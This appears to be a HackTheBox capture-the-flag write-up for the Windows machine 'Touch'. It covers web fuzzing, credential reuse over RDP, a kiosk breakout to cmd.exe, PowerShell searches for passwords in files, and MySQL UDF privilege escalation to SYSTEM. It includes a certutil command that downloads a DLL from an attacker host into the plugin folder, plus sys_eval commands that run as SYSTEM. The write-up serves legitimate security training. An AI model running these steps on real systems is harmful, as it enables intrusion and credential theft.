# Touch (HackTheBox) — Summary

## Recon

Full TCP port scan to avoid missing high ports:

```
nmap -sC -sV -Pn -p- <ip>
```

Found: two HTTP ports + RDP (3389). Windows target. The web service on the HTTP port is a kiosk/device login — the key insight was checking the page source, which hinted that the **default password = the device serial number**.

## Foothold — Web enumeration

Directory brute-forcing revealed `/api`, which alone gave nothing — but recursing on it (fuzzing one level deeper) surfaced `/api/scan` and `/api/status`. This is the core lesson: **don't stop at a dead-end endpoint, recurse on it**. The serial number found earlier worked as the default password on the kiosk login → dashboard access.

The dashboard exposed credentials used elsewhere in the environment. Those creds were reused for RDP (3389) — a reminder to always test **credential reuse across services**, not just the one where they were found.

## RDP → Kiosk breakout

Once in RDP, the "passport scanner" kiosk app threw an error when the scanner was toggled off from the admin panel. The error dialog contained a link to an internal support site hosted on the same Windows box. Opening that page in the embedded browser and using **Ctrl+O** (the native "Open file" dialog) let you type `cmd.exe` directly in the path bar — a classic kiosk-breakout technique: native OS file-picker dialogs aren't sandboxed by the restricted app, so they can spawn arbitrary processes.

User flag:

```
type C:\Users\<user>\Desktop\user.txt
```

## Privilege escalation — finding the DB

Enumerate listening ports to spot local services not obvious from the outside:

```
netstat -ano | findstr :3306
```

MySQL listening locally on 3306 → look for app config that talks to it. **Key technique for locating config/credential files when you don't know the path:**

```powershell
# search ProgramData first — apps often drop configs/scripts there, outside Program Files protections
Get-ChildItem -Path "C:\ProgramData" -Force

# search recursively by filename
Get-ChildItem -Path C:\ -Recurse -Force -Filter "db-config.ini" -ErrorAction SilentlyContinue

# search by extension across common config/script types
Get-ChildItem -Path C:\ -Recurse -Force -Include *.ini,*.ps1,*.bat,*.sql,*.env,*.config -ErrorAction SilentlyContinue

# search file *contents* for credential keywords
Get-ChildItem -Path C:\ -Recurse -Force -Include *.ini,*.ps1,*.bat,*.sql -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|root" -List

# view hidden files in a directory (cmd equivalent)
dir /a:h
dir /a
```

This surfaced `db-config.ini`, a `db-sync-replica.ps1`, and a `refresh-dates.bat` under `C:\ProgramData\<AppVendor>` — the `.bat` contained a **hardcoded root MySQL login**, reused from an automated task.

Connect to MySQL with recovered creds:

```
mysql.exe -u <user> -p<password> -h 127.0.0.1 -P 3306
```

## DB enumeration

```sql
SHOW DATABASES;
USE <db_name>;
SHOW TABLES;
DESCRIBE <table>;
SELECT <cols> FROM <table>;
```

Dumping staff/app tables is useful but the real find was continuing to search nearby files, which led to the **root** credentials (separate from the app-level DB user found first).

## Privilege escalation — MySQL UDF (abusing FILE privilege)

Check if root has file-level privileges:

```sql
SELECT user, host, File_priv FROM mysql.user WHERE user = 'root';
```

`File_priv = Y` → root can touch the filesystem via SQL, subject to `secure_file_priv`. Check that first — it changes the approach entirely:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

- Empty → `LOAD_FILE()` / `INTO DUMPFILE` work from any path.
- A path → source files must live inside it.
- `NULL` → file-based `LOAD_FILE`/`DUMPFILE` is **disabled outright** — this is what happened here, so that path was abandoned.

Find the plugin directory:

```sql
SHOW VARIABLES LIKE 'plugin_dir';
```

Check write permissions on it directly from the OS side (more reliable than assuming via SQL, especially once `secure_file_priv` blocks the DB-side copy):

```powershell
icacls "C:\MySQL\lib\plugin"
whoami
```

If your current user (or an inherited "Authenticated Users" ACL) shows `(M)` Modify or `(F)` Full control, you can **write the UDF DLL directly from the OS shell**, bypassing the SQL file functions entirely.

Download a MySQL UDF DLL (`lib_mysqludf_sys_64.dll`, from Metasploit) straight into the plugin folder:

```
certutil.exe -urlcache -split -f http://<attacker-ip>:<port>/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

(`-f` forces overwrite — needed if a prior failed attempt left a stale cache entry.)

Verify it landed:

```powershell
dir C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

Register and use the UDF:

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
SELECT sys_eval('whoami');
```

Output returns as hex by default — cast it to readable text directly in the query instead of decoding manually:

```sql
SELECT CAST(sys_eval('whoami') AS CHAR);
```

Result: `nt authority\system` — MySQL service runs as SYSTEM, so this UDF gives full RCE at the highest privilege level.

Read the root flag:

```sql
SELECT CAST(sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt') AS CHAR);
```

## Key takeaways

- Recurse past dead-end API endpoints instead of stopping.
- Default creds are often hinted at in page source/comments.
- Reuse discovered creds across every open service (web, RDP, DB).
- Native OS file dialogs (Save/Open) are a reliable kiosk-breakout vector.
- `ProgramData` is a prime, often-overlooked spot for app configs and scheduled scripts with hardcoded secrets.
- Check `File_priv` + `secure_file_priv` *before* assuming the SQL-side DUMPFILE approach will work — `NULL` kills it; fall back to OS-level ACLs on `plugin_dir`.
- `CAST(... AS CHAR)` beats manually decoding hex output from UDF calls.
